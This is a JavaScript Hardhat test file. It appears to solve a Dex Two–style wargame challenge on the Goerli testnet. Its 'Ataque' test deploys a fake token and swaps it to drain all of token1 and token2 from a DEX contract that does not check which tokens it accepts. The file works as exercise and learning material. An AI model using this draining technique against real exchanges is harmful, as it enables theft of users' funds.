const { expect, assert } = require("chai");
const { ethers } = require("hardhat");
const { api_key, } = require('../secrets.json');

describe("Dex", function () {
	let contract, provider, first_account, another_account;
	let dex_address = false;

	beforeEach(async function () {
		dex_address = "0x12e6939a934abac53FCa07047879BE6e96F71460";
		[first_account, another_account] = await ethers.getSigners();
		if (dex_address) {
			contract = await ethers.getContractAt("DexTwo", dex_address);
			provider = new ethers.providers.AlchemyProvider(network="goerli", api_key);
		} else {
			const Dex = await ethers.getContractFactory("DexTwo");
			contract = await Dex.deploy();
            await contract.deployed();
			dex_address = contract.address;

            const SwappableTokenTwo = await ethers.getContractFactory("SwappableTokenTwo");
			token1_contract = await SwappableTokenTwo.deploy(dex_address, "Token1", "TKN1", 110);
            token2_contract = await SwappableTokenTwo.deploy(dex_address, "Token2", "TKN2", 110);

            let tx = await contract.setTokens(token1_contract.address, token2_contract.address);
            await tx.wait();

            await contract.approve(dex_address, 100);
            tx = await contract.add_liquidity(token1_contract.address, 100);
            await tx.wait();
            tx = await contract.add_liquidity(token2_contract.address, 100);
            await tx.wait();
		}
		console.log("Contract address: ", dex_address);
	});

	it("Ataque", async function () {
        let token1Address = await contract.token1();
        let token2Address = await contract.token2();

        let dexBalanceToken1 = await contract.balanceOf(token1Address, dex_address);
        let dexBalanceToken2 = await contract.balanceOf(token2Address, dex_address);
        console.log("Dex Token1 balance", dexBalanceToken1);
        console.log("Dex Token2 balance", dexBalanceToken2);

        const FakeToken = await ethers.getContractFactory("FakeToken");
        let faketoken = await FakeToken.deploy(4);     
        
        // transfer and obtain 100 token1 doing a swap
        tx = await faketoken.transfer(dex_address, 1);
        await tx.wait();

        tx = await faketoken.approve(dex_address, 1);
        await tx.wait(); 
        tx = await contract.swap(faketoken.address, token1Address, 1);
        await tx.wait();

        dexBalanceToken1 = await contract.balanceOf(token1Address, dex_address);
        dexBalanceToken2 = await contract.balanceOf(token2Address, dex_address);
        dexBalanceTokenFake = await contract.balanceOf(faketoken.address, dex_address);
        console.log("Dex Token1 balance", dexBalanceToken1);
        console.log("Dex Token2 balance", dexBalanceToken2);
        console.log("Dex TokenFake balance", dexBalanceTokenFake);

        getSwapAmount = await contract.getSwapAmount(faketoken.address, token2Address, 2);
        console.log("getSwapAmount", getSwapAmount);

        // make the swap from 2 fake tokens (the total dex has right now) to 100 token2
        tx = await faketoken.approve(dex_address, 2);
        await tx.wait(); 
        tx = await contract.swap(faketoken.address, token2Address, 2);
        await tx.wait();

        dexBalanceToken1 = await contract.balanceOf(token1Address, dex_address);
        dexBalanceToken2 = await contract.balanceOf(token2Address, dex_address);
        console.log("Dex Token1 balance", dexBalanceToken1);
        console.log("Dex Token2 balance", dexBalanceToken2);
        expect(dexBalanceToken2).to.equal(0);
        expect(dexBalanceToken1).to.equal(0);
	});

	afterEach(async function() {
		// COMPLETAR
	});
});
